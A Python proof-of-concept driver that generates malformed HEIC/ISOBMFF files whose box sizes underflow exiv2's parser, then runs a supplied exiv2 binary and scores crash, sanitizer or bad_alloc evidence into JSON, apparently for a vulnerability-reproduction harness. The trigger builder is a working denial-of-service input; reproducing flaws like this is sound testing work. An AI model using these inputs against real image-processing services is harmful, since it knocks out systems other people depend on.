#!/usr/bin/env python3
"""PoC driver for exiv2 ISOBMFF (BMFF) parser allocation-size underflow.

The target (exiv2 1.0.0.9 era) parses ISO-BMFF style box headers
(``size`` + ``type``) without validating that ``size`` is at least the
box header size.  A box whose declared size is smaller than the 8-byte
header makes the parser compute a huge unsigned payload length and try
to allocate a buffer of that size.  On a vulnerable build this leads to
an uncaught ``std::bad_alloc`` (or, under a sanitizer / without address
space limits, a sanitizer diagnostic / OOM kill).  A fixed build rejects
the malformed box with an ordinary error.

The trigger file is generated dynamically in a temporary directory; the
target is driven through its normal command-line interface only.
"""

import argparse
import json
import os
import resource
import signal
import struct
import subprocess
import sys
import tempfile
import time

MAX_CAPTURE = 20000          # per-stream capture cap (bytes -> chars)
RLIMIT_AS_BYTES = 1 << 30    # 1 GiB address-space cap for non-instrumented runs
DEFAULT_TIMEOUT = 20.0

SANITIZER_BIN_MARKERS = (
    b"__asan", b"AddressSanitizer", b"libasan",
    b"__msan", b"MemorySanitizer",
    b"__ubsan", b"UndefinedBehaviorSanitizer",
    b"__tsan", b"ThreadSanitizer",
)

SANITIZER_OUT_MARKERS = (
    "AddressSanitizer", "MemorySanitizer",
    "UndefinedBehaviorSanitizer", "ThreadSanitizer",
    "LeakSanitizer", "SUMMARY: ", "runtime error:",
)

BAD_ALLOC_MARKERS = ("std::bad_alloc", "bad_alloc")


def build_trigger(variant):
    """Build a minimal ISOBMFF file with a malformed box size."""
    ftyp = (
        struct.pack(">I", 24) + b"ftyp"
        + b"heic" + struct.pack(">I", 0) + b"heic" + b"\x00" * 4
    )
    if variant == 0:
        # Box with declared size 4 (< 8-byte header): size underflow.
        body = struct.pack(">I", 4) + b"free"
    else:
        # Box with declared size 0 followed by slack: size underflow.
        body = struct.pack(">I", 0) + b"wide"
    data = ftyp + body
    if len(data) < 80:
        data += b"\x00" * (80 - len(data))
    return data


def detect_sanitizer(binary_path):
    try:
        with open(binary_path, "rb") as fh:
            blob = fh.read()
    except OSError:
        return False
    return any(marker in blob for marker in SANITIZER_BIN_MARKERS)


def decode(raw):
    return raw.decode("utf-8", errors="replace")


def truncate(text):
    if len(text) > MAX_CAPTURE:
        return text[:MAX_CAPTURE] + "...[truncated]"
    return text


def signal_name(num):
    try:
        return signal.Signals(num).name
    except (ValueError, AttributeError):
        return "SIG%d" % num


def limit_address_space():
    resource.setrlimit(resource.RLIMIT_AS, (RLIMIT_AS_BYTES, RLIMIT_AS_BYTES))


def run_target(argv, timeout, use_rlimit):
    """Run the target once; return a dict with the raw observations."""
    start = time.monotonic()
    timed_out = False
    popen_kwargs = {}
    if use_rlimit and hasattr(os, "setsid"):
        popen_kwargs["preexec_fn"] = limit_address_space
    elif use_rlimit:
        popen_kwargs["preexec_fn"] = limit_address_space
    proc = subprocess.Popen(
        argv,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        **popen_kwargs,
    )
    try:
        out, err = proc.communicate(timeout=timeout)
    except subprocess.TimeoutExpired:
        timed_out = True
        try:
            proc.kill()
        except OSError:
            pass
        out, err = proc.communicate()
    runtime_ms = int((time.monotonic() - start) * 1000)
    rc = proc.returncode
    return {
        "returncode": rc if not timed_out else None,
        "signal": signal_name(-rc) if (not timed_out and rc is not None and rc < 0) else None,
        "timed_out": timed_out,
        "runtime_ms": runtime_ms,
        "stdout": truncate(decode(out or b"")),
        "stderr": truncate(decode(err or b"")),
    }


def first_marker_line(text, markers):
    for line in text.splitlines():
        if any(m in line for m in markers):
            return line.strip()
    return None


def first_nonempty_line(*texts):
    for text in texts:
        for line in text.splitlines():
            line = line.strip()
            if line:
                return line
    return ""


def evidence_score(run):
    """Higher score = stronger evidence of memory-corruption behavior."""
    if run["signal"]:
        return 3
    combined = run["stdout"] + "\n" + run["stderr"]
    if first_marker_line(combined, SANITIZER_OUT_MARKERS):
        return 2
    if first_marker_line(combined, BAD_ALLOC_MARKERS):
        return 1
    return 0


def make_observable(run):
    """Normalize the checker-facing evidence object."""
    if run["signal"]:
        return {"kind": "crash_trace", "value": run["signal"], "path": None}
    combined = run["stdout"] + "\n" + run["stderr"]
    line = first_marker_line(combined, SANITIZER_OUT_MARKERS)
    if line:
        return {"kind": "stderr", "value": line[:500], "path": None}
    line = first_marker_line(combined, BAD_ALLOC_MARKERS)
    if line:
        return {"kind": "stderr", "value": line[:500], "path": None}
    if run["timed_out"]:
        return {
            "kind": "custom",
            "value": "timeout: process exceeded time limit and was killed",
            "path": None,
        }
    text = first_nonempty_line(run["stderr"], run["stdout"])
    return {"kind": "stderr", "value": text[:500], "path": None}


def main():
    parser = argparse.ArgumentParser(description="exiv2 BMFF parser PoC driver")
    parser.add_argument("--binary", required=True, help="path to the target exiv2 binary")
    parser.add_argument("--json-out", default=None, help="also write the JSON result here")
    parser.add_argument("--timeout", type=float, default=DEFAULT_TIMEOUT,
                        help="per-run timeout in seconds")
    args = parser.parse_args()

    result = {
        "binary": args.binary,
        "command": None,
        "returncode": None,
        "signal": None,
        "timed_out": False,
        "runtime_ms": 0,
        "stdout": "",
        "stderr": "",
        "observable": {"kind": "custom", "value": "", "path": None},
        "error": None,
    }

    binary = args.binary
    if not os.path.isfile(binary):
        result["error"] = "binary not found: %s" % binary
        emit(result, args.json_out)
        return 2
    if not os.access(binary, os.X_OK):
        result["error"] = "binary is not executable: %s" % binary
        emit(result, args.json_out)
        return 2

    timeout = args.timeout if args.timeout and args.timeout > 0 else DEFAULT_TIMEOUT
    instrumented = detect_sanitizer(binary)
    # Sanitizer runtimes map huge shadow regions, so RLIMIT_AS would break
    # them; plain builds get a 1 GiB cap so the vulnerable build fails fast
    # and deterministically with std::bad_alloc instead of swapping for ages.
    use_rlimit = not instrumented

    best_run = None
    best_score = -1
    command = None
    try:
        with tempfile.TemporaryDirectory(prefix="exiv2_poc_") as tmp:
            for variant in (0, 1):
                trigger_path = os.path.join(tmp, "poc_v%d.heic" % variant)
                with open(trigger_path, "wb") as fh:
                    fh.write(build_trigger(variant))
                candidate = [binary, "pr", trigger_path]
                run = run_target(candidate, timeout, use_rlimit)
                score = evidence_score(run)
                if score > best_score:
                    best_run = run
                    best_score = score
                    command = candidate
                if score >= 1:
                    break  # evidence found; no need for further variants
    except Exception as exc:  # internal script failure
        result["error"] = "internal error: %s: %s" % (type(exc).__name__, exc)
        emit(result, args.json_out)
        return 3

    run = best_run
    result["command"] = command
    result["returncode"] = run["returncode"]
    result["signal"] = run["signal"]
    result["timed_out"] = run["timed_out"]
    result["runtime_ms"] = run["runtime_ms"]
    result["stdout"] = run["stdout"]
    result["stderr"] = run["stderr"]
    result["observable"] = make_observable(run)
    emit(result, args.json_out)
    return 0


def emit(result, json_out):
    text = json.dumps(result)
    if json_out:
        try:
            with open(json_out, "w") as fh:
                fh.write(text + "\n")
        except OSError as exc:
            result["error"] = "cannot write --json-out: %s" % exc
            text = json.dumps(result)
    print(text)


if __name__ == "__main__":
    sys.exit(main())
